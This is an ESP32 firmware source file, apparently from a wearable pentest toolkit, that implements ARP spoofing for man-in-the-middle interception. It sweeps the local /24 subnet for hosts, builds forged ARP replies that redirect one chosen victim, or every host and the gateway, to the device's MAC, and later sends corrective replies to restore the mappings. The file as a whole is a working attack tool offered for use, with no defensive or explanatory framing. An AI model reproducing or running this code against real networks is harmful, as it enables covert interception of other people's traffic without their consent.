#include "arp_mitm.h"
#include "wifi_creds.h"
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>
#include <stdio.h>

// ---------------------------------------------------------------------------
// The raw L2 TX/RX entry points live in the SDK's libnet80211 but are not in a
// public header on every core, so we declare them ourselves (the same trick
// deauther.cpp uses for the sanity-check override). esp_wifi_internal_tx sends
// a complete Ethernet II frame over the associated STA link (the AP relays it);
// reg_rxcb hands us every inbound 802.3 frame so we can harvest ARP replies.
// ---------------------------------------------------------------------------
extern "C" {
  typedef esp_err_t (*wifi_rxcb_t)(void *buffer, uint16_t len, void *eb);
  esp_err_t esp_wifi_internal_reg_rxcb(wifi_interface_t ifx, wifi_rxcb_t fn);
  esp_err_t esp_wifi_internal_tx(wifi_interface_t wifi_if, void *buffer, uint16_t len);
  esp_err_t esp_wifi_internal_free_rx_buffer(void *buffer);
}

struct ArpHost { uint8_t ip4; uint8_t mac[6]; };

static const uint8_t BCAST[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
static const uint8_t ZERO6[6] = { 0, 0, 0, 0, 0, 0 };

// ---- shared state -----------------------------------------------------------
static ArpHost       s_hosts[ARP_MAX_HOSTS];
static volatile int  s_host_n = 0;
static portMUX_TYPE  s_mux = portMUX_INITIALIZER_UNLOCKED;

static uint8_t  s_base[4]  = { 0, 0, 0, 0 };   // first 3 octets = /24 prefix
static uint8_t  s_ourmac[6];
static uint8_t  s_ourip[4];
static uint8_t  s_gwip4    = 0;
static bool     s_ctx_ok   = false;

static volatile bool s_sniff   = false;   // rxcb records only while true
static bool          s_rxcb_on = false;

static TaskHandle_t      s_task = nullptr;
static volatile bool     s_run  = false;
static volatile bool     s_want_sweep  = false;
static volatile bool     s_sweeping    = false;
static volatile bool     s_sweep_done  = false;
static volatile bool     s_poison      = false;
static volatile uint32_t s_cycles      = 0;

static volatile int s_target = -1;    // -2 = ALL, >=0 = single victim (by value below)
static ArpHost      s_victim;

// ---- RX callback: harvest ARP replies into the host table -------------------
static esp_err_t arp_rx_cb(void *buffer, uint16_t len, void *eb) {
  if (s_sniff && buffer && len >= 42) {
    const uint8_t *f = (const uint8_t *)buffer;
    if (f[12] == 0x08 && f[13] == 0x06) {                 // ethertype ARP
      const uint8_t *a = f + 14;
      uint16_t oper = ((uint16_t)a[6] << 8) | a[7];
      if (oper == 2) {                                     // ARP reply
        const uint8_t *sha = a + 8;
        const uint8_t *spa = a + 14;
        if (spa[0] == s_base[0] && spa[1] == s_base[1] && spa[2] == s_base[2]) {
          portENTER_CRITICAL(&s_mux);
          bool found = false;
          for (int i = 0; i < s_host_n; i++)
            if (s_hosts[i].ip4 == spa[3]) { found = true; break; }
          if (!found && s_host_n < ARP_MAX_HOSTS) {
            s_hosts[s_host_n].ip4 = spa[3];
            memcpy(s_hosts[s_host_n].mac, sha, 6);
            s_host_n++;
          }
          portEXIT_CRITICAL(&s_mux);
        }
      }
    }
  }
  if (eb) esp_wifi_internal_free_rx_buffer(eb);
  return ESP_OK;
}

// ---- frame building ---------------------------------------------------------
static void arp_build(uint8_t *out, const uint8_t *eth_dst, uint16_t oper,
                      const uint8_t *sha, const uint8_t *spa,
                      const uint8_t *tha, const uint8_t *tpa) {
  memcpy(out + 0, eth_dst, 6);
  memcpy(out + 6, s_ourmac, 6);
  out[12] = 0x08; out[13] = 0x06;
  uint8_t *a = out + 14;
  a[0] = 0x00; a[1] = 0x01;                  // htype Ethernet
  a[2] = 0x08; a[3] = 0x00;                  // ptype IPv4
  a[4] = 6;    a[5] = 4;
  a[6] = (oper >> 8) & 0xff; a[7] = oper & 0xff;
  memcpy(a + 8,  sha, 6);
  memcpy(a + 14, spa, 4);
  memcpy(a + 18, tha, 6);
  memcpy(a + 24, tpa, 4);
}

static inline void arp_tx(const uint8_t *frame) {
  esp_wifi_internal_tx(WIFI_IF_STA, (void *)frame, 42);
}

static bool find_gw(uint8_t out_mac[6]) {
  bool ok = false;
  portENTER_CRITICAL(&s_mux);
  for (int i = 0; i < s_host_n; i++)
    if (s_hosts[i].ip4 == s_gwip4) { memcpy(out_mac, s_hosts[i].mac, 6); ok = true; break; }
  portEXIT_CRITICAL(&s_mux);
  return ok;
}

// ---- context (our IP/MAC/gateway), read while lwIP is still alive -----------
static void load_ctx() {
  IPAddress ip = WiFi.localIP();
  IPAddress gw = WiFi.gatewayIP();
  IPAddress base = (gw[0] != 0) ? gw : ip;
  s_base[0] = base[0]; s_base[1] = base[1]; s_base[2] = base[2]; s_base[3] = 0;
  s_ourip[0] = ip[0]; s_ourip[1] = ip[1]; s_ourip[2] = ip[2]; s_ourip[3] = ip[3];
  s_gwip4 = (gw[0] != 0) ? gw[3] : 1;
  esp_wifi_get_mac(WIFI_IF_STA, s_ourmac);
  s_ctx_ok = true;
}

// ---- the worker task --------------------------------------------------------
static void do_sweep() {
  s_sweeping = true;
  if (!s_rxcb_on) { esp_wifi_internal_reg_rxcb(WIFI_IF_STA, arp_rx_cb); s_rxcb_on = true; }
  portENTER_CRITICAL(&s_mux); s_host_n = 0; portEXIT_CRITICAL(&s_mux);
  s_sniff = true;

  uint8_t frame[42];
  for (int h = 1; h <= 254 && s_run; h++) {
    uint8_t tpa[4] = { s_base[0], s_base[1], s_base[2], (uint8_t)h };
    arp_build(frame, BCAST, 1, s_ourmac, s_ourip, ZERO6, tpa);
    arp_tx(frame);
    vTaskDelay(pdMS_TO_TICKS(3));
  }
  uint32_t t = millis();
  while (millis() - t < 1500 && s_run) vTaskDelay(pdMS_TO_TICKS(10));

  s_sniff = false;
  s_sweeping = false;
  s_sweep_done = true;
}

static void poison_pass() {
  uint8_t frame[42];
  uint8_t gwip[4] = { s_base[0], s_base[1], s_base[2], s_gwip4 };
  uint8_t gw_mac[6];
  bool have_gw = find_gw(gw_mac);

  if (s_target == ARP_TARGET_ALL) {
    portENTER_CRITICAL(&s_mux); int n = s_host_n; portEXIT_CRITICAL(&s_mux);
    for (int i = 0; i < n; i++) {
      ArpHost h;
      portENTER_CRITICAL(&s_mux); h = s_hosts[i]; portEXIT_CRITICAL(&s_mux);
      if (h.ip4 == s_gwip4) continue;
      uint8_t hip[4] = { s_base[0], s_base[1], s_base[2], h.ip4 };
      arp_build(frame, h.mac, 2, s_ourmac, gwip, h.mac, hip); arp_tx(frame);
      arp_build(frame, have_gw ? gw_mac : BCAST, 2, s_ourmac, hip,
                have_gw ? gw_mac : BCAST, gwip); arp_tx(frame);
    }
    if (n == 0) { arp_build(frame, BCAST, 2, s_ourmac, gwip, BCAST, gwip); arp_tx(frame); }
  } else {
    ArpHost v = s_victim;
    if (v.ip4 != s_gwip4) {
      uint8_t vip[4] = { s_base[0], s_base[1], s_base[2], v.ip4 };
      arp_build(frame, v.mac, 2, s_ourmac, gwip, v.mac, vip); arp_tx(frame);
      if (have_gw) { arp_build(frame, gw_mac, 2, s_ourmac, vip, gw_mac, gwip); arp_tx(frame); }
    }
  }
}

static void engine_task(void *) {
  while (s_run) {
    if (s_want_sweep) { s_want_sweep = false; do_sweep(); }
    if (s_poison) {
      poison_pass();
      s_cycles++;
      vTaskDelay(pdMS_TO_TICKS(10));
    } else {
      vTaskDelay(pdMS_TO_TICKS(20));
    }
  }
  s_task = nullptr;
  vTaskDelete(nullptr);
}

static void ensure_task() {
  if (s_task) return;
  s_run = true;
  // Pinned to the WiFi core (0), like deauther, so the TX loop sits next to the
  // driver and doesn't fight LVGL on core 1.
  xTaskCreatePinnedToCore(engine_task, "arpmitm", 4096, nullptr, 1, &s_task, 0);
}

// ---- restore ARP-corrected mappings, then bring the radio back --------------
static void heal_now() {
  uint8_t gw_mac[6];
  if (!find_gw(gw_mac)) return;
  uint8_t frame[42];
  uint8_t gwip[4] = { s_base[0], s_base[1], s_base[2], s_gwip4 };
  portENTER_CRITICAL(&s_mux); int n = s_host_n; portEXIT_CRITICAL(&s_mux);
  for (int r = 0; r < 4; r++) {
    for (int i = 0; i < n; i++) {
      ArpHost h;
      portENTER_CRITICAL(&s_mux); h = s_hosts[i]; portEXIT_CRITICAL(&s_mux);
      if (h.ip4 == s_gwip4) continue;
      uint8_t hip[4] = { s_base[0], s_base[1], s_base[2], h.ip4 };
      arp_build(frame, h.mac, 2, gw_mac, gwip, h.mac, hip); arp_tx(frame);   // victim: real gw
      arp_build(frame, gw_mac, 2, h.mac, hip, gw_mac, gwip); arp_tx(frame);  // gw: real host
      delay(2);
    }
  }
}

// ---- public API -------------------------------------------------------------
ArpNet arp_mitm_prepare() {
  s_sweep_done = false;
  if (WiFi.status() == WL_CONNECTED) { load_ctx(); return ARP_NET_CONNECTED; }

  char ssid[33], pass[65];
  if (!wifi_creds_get(ssid, sizeof(ssid), pass, sizeof(pass))) return ARP_NET_NONE;
  WiFi.mode(WIFI_STA);
  if (pass[0]) WiFi.begin(ssid, pass);
  else         WiFi.begin(ssid);
  return ARP_NET_CONNECTING;
}

ArpNet arp_mitm_poll_net() {
  if (WiFi.status() == WL_CONNECTED) {
    if (!s_ctx_ok) load_ctx();
    return ARP_NET_CONNECTED;
  }
  return ARP_NET_CONNECTING;
}

void arp_mitm_net_info(char *out, int out_sz) {
  if (!s_ctx_ok) { snprintf(out, out_sz, "not connected"); return; }
  snprintf(out, out_sz, "%s  %u.%u.%u.%u  gw .%u",
           WiFi.SSID().c_str(),
           s_ourip[0], s_ourip[1], s_ourip[2], s_ourip[3], s_gwip4);
}

void arp_mitm_request_sweep() {
  if (!s_ctx_ok) return;
  ensure_task();
  s_sweep_done = false;
  s_want_sweep = true;
}

bool arp_mitm_sweeping()  { return s_sweeping || s_want_sweep; }
bool arp_mitm_sweep_done(){ return s_sweep_done; }

int arp_mitm_host_count() {
  portENTER_CRITICAL(&s_mux); int n = s_host_n; portEXIT_CRITICAL(&s_mux);
  return n;
}

bool arp_mitm_host(int i, uint8_t *ip4, uint8_t mac[6], bool *is_gw) {
  bool ok = false;
  portENTER_CRITICAL(&s_mux);
  if (i >= 0 && i < s_host_n) {
    if (ip4) *ip4 = s_hosts[i].ip4;
    if (mac) memcpy(mac, s_hosts[i].mac, 6);
    if (is_gw) *is_gw = (s_hosts[i].ip4 == s_gwip4);
    ok = true;
  }
  portEXIT_CRITICAL(&s_mux);
  return ok;
}

void arp_mitm_prefix(uint8_t out3[3]) {
  out3[0] = s_base[0]; out3[1] = s_base[1]; out3[2] = s_base[2];
}

bool arp_mitm_start(int target) {
  if (!s_ctx_ok) return false;
  if (target >= 0) {
    ArpHost v;
    portENTER_CRITICAL(&s_mux);
    bool ok = (target < s_host_n);
    if (ok) v = s_hosts[target];
    portEXIT_CRITICAL(&s_mux);
    if (!ok || v.ip4 == s_gwip4) return false;   // don't "MitM" the gateway itself
    s_victim = v;
    s_target = target;
  } else {
    s_target = ARP_TARGET_ALL;
  }
  ensure_task();
  s_cycles = 0;
  s_poison = true;
  return true;
}

void arp_mitm_stop() {
  s_poison = false;

  // Kill the worker first so heal_now() has the table to itself (no races).
  if (s_run) {
    s_run = false;
    for (int i = 0; i < 40 && s_task; i++) delay(5);
  }

  heal_now();

  if (s_rxcb_on) { esp_wifi_internal_reg_rxcb(WIFI_IF_STA, NULL); s_rxcb_on = false; }
  // Leave the WiFi radio fully OFF. This watch can't run WiFi + BLE at the same
  // time (see scan_radio.cpp), so we must NOT leave STA up for the next (BLE)
  // tool or its controller bring-up hard-freezes the UI. Re-entering ARP MitM
  // re-joins the network via arp_mitm_prepare().
  WiFi.disconnect(true);
  WiFi.mode(WIFI_OFF);

  s_ctx_ok = false;
  s_sweep_done = false;
  portENTER_CRITICAL(&s_mux); s_host_n = 0; portEXIT_CRITICAL(&s_mux);
}

bool     arp_mitm_is_running() { return s_poison; }
uint32_t arp_mitm_cycles()     { return s_cycles; }
